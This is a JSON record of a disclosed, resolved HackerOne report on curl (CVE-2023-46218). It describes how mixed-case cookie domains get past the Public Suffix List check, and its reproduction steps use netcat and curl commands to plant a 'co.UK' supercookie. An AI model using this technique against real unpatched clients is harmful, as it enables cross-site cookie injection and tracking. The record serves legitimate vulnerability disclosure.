{
  "id": 2212193,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjEyMTkz",
  "url": "https://hackerone.com/reports/2212193",
  "title": "CVE-2023-46218: cookie mixed case PSL bypass",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2023-10-16T18:28:56.686Z",
  "submitted_at": "2023-10-16T18:28:56.837Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "nyymi",
    "url": "/nyymi",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35663,
    "url": "https://hackerone.com/curl",
    "handle": "curl",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "curl",
      "twitter_handle": "",
      "website": "https://curl.se",
      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2023-46218"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2023-12-06T11:55:09.117Z",
  "bug_reporter_agreed_on_going_public_at": "2023-12-06T11:55:08.982Z",
  "team_member_agreed_on_going_public_at": "2023-12-06T11:49:11.074Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nlibcurl fails to normalize the `hostname` and `cookie_domain` parameters passed to `psl_is_cookie_domain_acceptable` function. As a result a malicious site can set a super cookie if the victim requests the url with hostname with any upper case characters in the domain part of the hostname.\n\nlibpsl `psl_is_cookie_domain_acceptable` documentation  https://rockdaboot.github.io/libpsl/libpsl-Public-Suffix-List-functions.html#psl-is-cookie-domain-acceptable says the following:\n```\nUse helper function psl_str_to_utf8lower() for normalization of hostname and cookie_domain .\n```\nThis is not done correctly and hence domains with uppercase characters will bypass the PSL check. Note that curl itself will later ignore the cookie domain capitalization and will match even lowercase hostname with the stored supercookie's mixed case domain.\n\nIt's also worth noting that the request `Host` header will reveal the mixed case used, which will allow the attacker to prepare the correct `Set-Cookie` domain for the attack.\n\n## Steps To Reproduce:\n  1. `echo -ne \"HTTP/1.1 200 OK\\r\\nSet-Cookie: super=oops; domain=co.UK\\r\\nContent-Length: 0\\r\\n\" | nc -v -l -q 1 -p 8888`\n  2. `curl -v -c c.txt --resolve test.co.uk:8888:testserverip http://test.co.UK:8888`\n  3.  `nc -v -l -p 7777`\n  4. `curl -v -b c.txt --resolve other.co.uk:7777:testserverip http://other.co.uk:7777`\n\nNote that the `super` cookie is sent to the `other.com.uk` site. In fact it will be sent to any `.co.uk` hosts now.\n\nThe generated cookie file:\n```\n# Netscape HTTP Cookie File\n# https://curl.se/docs/http-cookies.html\n# This file was generated by libcurl! Edit at your own risk.\n\n.co.UK\tTRUE\t/\tFALSE\t0\tsuper\toops\n```\n\n## Impact\n\nBypassing supercookie protection.",
  "weakness": {
    "id": 113,
    "name": "Information Exposure Through Sent Data"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2024-01-05T11:49:11.171Z",
  "allow_singular_disclosure_after": -53942155.59410374,
  "singular_disclosure_allowed": true,
  "vote_count": 27,
  "voters": [
    "zy9ard3",
    "kartikg4rg",
    "neilx",
    "eminfidan",
    "0xkalki",
    "trinityisdead",
    "spencerku",
    "sahidrahmanx",
    "soohongkim123",
    "snailgt",
    "and 17 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 18844,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/curl/curl",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
